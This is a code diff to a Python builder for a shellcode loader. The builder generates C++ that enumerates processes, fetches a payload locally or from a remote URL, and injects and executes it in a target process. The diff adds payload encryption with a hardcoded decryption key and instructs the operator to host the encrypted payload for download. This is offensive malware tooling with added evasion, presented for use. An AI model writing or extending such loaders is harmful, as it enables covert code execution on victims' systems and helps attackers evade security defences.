@@ -2,8 +2,9 @@ import os
 import time
 from cli import *
 from local_load import *
+from encryptor import *
 
-def build (Enumeration, Payload, ProcessName, Loader, Url):
+def build (Encryption, Enumeration, Payload, ProcessName, Loader, Url):
     f = open ("main.cpp", "a")
     f.write(f"""
 #include <iostream>
@@ -14,6 +15,11 @@ def build (Enumeration, Payload, ProcessName, Loader, Url):
 #include "Libraries/FetchFromURL.h"
 """)   
     
+    if Encryption != "null":
+        f.write(f"""\n
+#include "Libraries/{Encryption}"
+""")
+        
     if Enumeration != "null":
         f.write(f"""\n
 #include "Libraries/{Enumeration}"
@@ -67,6 +73,14 @@ int main()
     else:
         pass
 
+    if Encryption != "null":
+        f.write(f"""\n
+    char bKey[] = {{ 0x00, 0x11, 0x22 }};
+    size_t sKeySize = sizeof(bKey);
+    PBYTE pbKey = (PBYTE)bKey;
+    Decrypt(pPayloadAddress, pPayloadSize, pbKey, sKeySize);
+""")
+
     f.write(f"""\n
     if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
         printf("Failed to execute payload");
@@ -117,12 +131,25 @@ def restore_header_file(Enumeration, Loader, ApiMode):
 
 def main():
 
-    if set_payload_location() == "2":
+    Payload_Location = set_payload_location()
+    if Payload_Location == "2":
         Url = set_url()
-        Payload = "null"
+        Payload = remote_payload_fetch(Url)
     else:
         Payload = local_payload_fetch()
         Url = "null"
+    
+    Encryption = set_payload_encryption()
+    if Encryption != "null":
+        build_encryptor(Encryption, Payload)
+        if Payload_Location == "1":
+            Payload = read_encrypted_payload()
+        elif Payload_Location == "2":
+            Payload = "null"
+            print("\n[!!]NOTE[!!]\nEncrypted Payload is saved as encrypted.bin")
+            print(f"Please host the encrypted.bin at {Url}")
+    else:
+        pass
     
     #TODO  set_payload_encryption()
 
@@ -145,12 +172,14 @@ def main():
 
     change_header_file(Enumeration, Loader, ApiMode)
 
-    if not build(Enumeration, Payload, ProcessName, Loader, Url):
+    if not build(Encryption, Enumeration, Payload, ProcessName, Loader, Url):
         print(f"\nPayload Built Successfully!\nHave Fun! :)")
     else:
         print(f"\nFailed to build payload :(")
     
     restore_header_file(Enumeration, Loader, ApiMode)
+    if Payload_Location == "1":
+        os.remove("encrypted.bin")
 
 
 if __name__ == "__main__":
